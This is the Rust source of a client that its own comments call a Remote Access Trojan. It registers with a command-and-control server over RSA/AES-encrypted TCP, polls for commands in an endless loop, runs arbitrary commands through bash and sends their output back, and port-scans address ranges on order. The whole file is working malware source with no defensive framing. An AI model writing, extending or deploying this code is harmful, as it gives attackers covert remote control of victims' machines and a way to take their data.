#[macro_use(println_d)]
extern crate common;
#[macro_use]
extern crate log;
mod errors;
mod input;
mod port_strategy;
mod scanner;
use cidr_utils::cidr::IpCidr;
use common::common::*;
use errors::CustomError;
use futures::executor::block_on;
use input::{PortRange, ScanOrder};
use port_strategy::PortStrategy;
use rand::rngs::OsRng;
use rsa::pkcs1::ToRsaPublicKey;
use rsa::{PaddingScheme, RsaPrivateKey, RsaPublicKey};
use scanner::Scanner;
use serde::de::DeserializeOwned;
use std::error;
use std::fmt::Debug;
use std::io::{Read, Write};
use std::net::IpAddr;
use std::net::TcpStream;
use std::process::Command;
use std::str;
use std::time::Duration;
use std::{thread, time};
const CLIENT_VERSION: &str = "0.0.1";
const HOST: &str = "127.0.0.1";
const PORT: usize = 8080;
const DEFAULT_CHECK_INTERVAL: time::Duration = time::Duration::from_secs(5 * 60); // 5min
const SOCK_READ_TIMEOUT: time::Duration = time::Duration::from_secs(10);
const SOCK_WRITE_TIMEOUT: time::Duration = time::Duration::from_secs(10);
// Change the alias to `Box<error::Error>`.
type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
struct Client {
    host: String,
    port: usize,
    uuid: String,
    version: String,
    sleep_interval: Duration,
    aes_key: String,
    rsa_public_key: RsaPublicKey,
    rsa_private_key: RsaPrivateKey,
}
impl Client {
    // Create a new RAT client
    fn new(host: &str, port: usize) -> Result<Client> {
        // generate rsa private/public keys so that the server can send us a aes key for further communications
        println_d!("generate rsa keys");
        let mut rng = OsRng;
        let rsa_private_key = RsaPrivateKey::new(&mut rng, 2048)?;
        let rsa_public_key = RsaPublicKey::from(&rsa_private_key);
        println_d!("rsa generated");
        Ok(Client {
            version: CLIENT_VERSION.to_owned(),
            aes_key: "".to_string(),
            uuid: "".to_owned(),
            host: host.to_owned(),
            port,
            sleep_interval: DEFAULT_CHECK_INTERVAL,
            rsa_public_key,
            rsa_private_key,
        })
    }
    // try to get a uuid from server
    fn register(&mut self) -> Result<()> {
        let pem = self.rsa_public_key.to_pkcs1_pem()?;
        let payload = RegisterPayload { public_key: pem };
        let r: Response<RegisterRes> = self.send_register(payload)?;
        let p = r.payload.ok_or("no payload")?;
        println_d!("register -> uuid: {}", p.uuid);
        self.uuid = p.uuid;
        self.aes_key = p.aes_key;
        Ok(())
    }
    // If the CnC doesn't reconize the client uuid, we need to register again.
    fn deregister(&mut self) {
        self.aes_key = "".to_owned();
        self.uuid = "".to_owned();
    }
    // Return either or not the client is currently registered with the CnC
    fn is_registered(&self) -> bool {
        self.uuid != ""
    }
    // Will try to register until we get a uuid from server
    fn must_register(&mut self) {
        loop {
            match self.register() {
                Ok(_) => return,
                Err(e) => println_d!("{:?}", e),
            }
            thread::sleep(time::Duration::from_secs(60)); // 1min
        }
    }
    // Ask server if he has command for us to execute
    fn get_command(&mut self) -> Result<Vec<Cmd>> {
        let payload = Payload::GetCommand(AskPayload {});
        let r: Response<AskRes> = self.send_auth_payload(payload)?;
        let p = r.payload.ok_or("no payload")?;
        Ok(p.cmds)
    }
    fn execute_cmds(&mut self, cmds: Vec<Cmd>) {
        for cmd in cmds.into_iter() {
            self.execute_cmd(cmd);
        }
    }
    fn execute_cmd(&mut self, cmd: Cmd) {
        match cmd {
            Cmd::PortScan(host, port_begin, port_end) => {
                self.port_scan_cmd(host, port_begin, port_end)
            }
            Cmd::Version => self.get_version_cmd(),
            Cmd::Exec(cmd) => self.exec_cmd(&cmd),
            Cmd::UpdateSleepInterval(ms) => self.update_sleep_interval(ms),
            Cmd::Sleep(dur) => self.sleep_cmd(dur),
        }
    }
    fn sleep_cmd(&self, dur: time::Duration) {
        println_d!("sleep for {:?}", dur);
        thread::sleep(dur);
    }
    fn update_sleep_interval(&mut self, new_interval_ms: u64) {
        self.sleep_interval = time::Duration::from_millis(new_interval_ms);
    }
    fn exec_cmd(&mut self, cmd: &str) {
        let out = match Command::new("bash").arg("-c").arg(cmd).output() {
            Ok(out) => out,
            Err(e) => {
                println_d!("failed to execute command : {:?}", e);
                return;
            }
        };
        let payload = Payload::Exec(ExecPayload { stdout: out.stdout });
        let _: Result<Response<AckRes>> = self.send_auth_payload(payload);
    }
    fn port_scan_cmd(&mut self, host: String, port_begin: u16, port_end: u16) {
        let ips: Vec<IpAddr> = IpCidr::from_str(host)
            .map(|cidr| cidr.iter().collect())
            .unwrap();
        let scanner = Scanner::new(
            &ips,
            200,
            time::Duration::from_secs(120),
            2,
            PortStrategy::pick(
                &Some(PortRange {
                    start: port_begin,
                    end: port_end,
                }),
                None,
                ScanOrder::Serial,
            ),
        );
        let scan_result = block_on(scanner.run());
        let payload = Payload::PortScan(PortScanPayload {
            result: scan_result,
        });
        let _: Result<Response<AckRes>> = self.send_auth_payload(payload);
    }
    fn get_version_cmd(&mut self) {
        let version = self.version.clone();
        let payload = Payload::Version(VersionPayload { version });
        let _: Result<Response<AckRes>> = self.send_auth_payload(payload);
    }
    fn aes_decrypt(&self, buf: Vec<u8>) -> Result<String> {
        aes_decrypt(&self.aes_key, buf)
    }
    fn rsa_decrypt(&self, buf: Vec<u8>) -> Result<String> {
        let dec_data = self
            .rsa_private_key
            .decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &buf)?;
        let dec_str = String::from_utf8(dec_data)?;
        Ok(dec_str)
    }
    fn get_tcp_stream(&self) -> Result<TcpStream> {
        let tcp_stream = TcpStream::connect(format!("{}:{}", self.host, self.port))?;
        tcp_stream.set_read_timeout(Some(SOCK_READ_TIMEOUT))?;
        tcp_stream.set_write_timeout(Some(SOCK_WRITE_TIMEOUT))?;
        Ok(tcp_stream)
    }
    fn send_register(&self, payload: RegisterPayload) -> Result<Response<RegisterRes>> {
        let mut tcp_stream = self.get_tcp_stream()?;
        let mut j = serde_json::to_vec(&payload)?;
        j.push(b'\n');
        println_d!("send: {:?}", j);
        tcp_stream.write_all(&j)?;
        let mut buf = vec![];
        tcp_stream.read_to_end(&mut buf)?;
        let dec = self.rsa_decrypt(buf)?;
        let res: Response<RegisterRes> = serde_json::from_str(&dec)?;
        Ok(res)
    }
    fn send_auth_payload<R>(&mut self, payload: Payload) -> Result<Response<R>>
    where
        R: DeserializeOwned + Debug,
    {
        let mut tcp_stream = self.get_tcp_stream()?;
        println_d!("send: {:?}", payload);
        let p = AuthPayload {
            client_uuid: self.uuid.clone(),
            payload: payload.aes_encrypt(&self.aes_key)?,
        };
        let mut j = serde_json::to_vec(&p)?;
        j.push(b'\n');
        tcp_stream.write_all(&j)?;
        let mut buf = vec![];
        tcp_stream.read_to_end(&mut buf)?;
        // If server doesn't reconize the UUID, clear registration information so that we register again
        if let Ok(_) = serde_json::from_slice::<Response<UnknownUUIDRes>>(&buf) {
            println_d!("unknown uuid, deregister");
            self.deregister();
            return Err(Box::new(CustomError::UnknownUUID));
        }
        // We receive aes encrypted messages from server
        let dec = self.aes_decrypt(buf)?;
        println_d!("recv: {:?}", dec);
        // Json deserialize decrypted message
        let res: Response<R> = serde_json::from_str(&dec)?;
        Ok(res)
    }
}
// RAT (Remote Access Trojan) client
//
// When the client starts, it first generate a RSA public/private key pair.
// It then sends the public key to the CnC and receive an encrypted
// message containing both a UUID and a AES key.
//
// All further communications with the CnC (Command & Control)
// server are encrypted using AES GCM algorithm.
fn main() {
    println_d!("start client v{}", CLIENT_VERSION);
    // The only reason we would fail to create a client is if we fail to generate a rsa private key.
    // This should never happen.
    if let Ok(mut client) = Client::new(HOST, PORT) {
        loop {
            client.must_register();
            // Loop forever, ask server for commands/procedures to execute
            loop {
                if let Ok(cmds) = client.get_command() {
                    client.execute_cmds(cmds);
                }
                if !client.is_registered() {
                    break;
                }
                println_d!("next check in {:?}", client.sleep_interval);
                thread::sleep(client.sleep_interval);
            }
        }
    }
}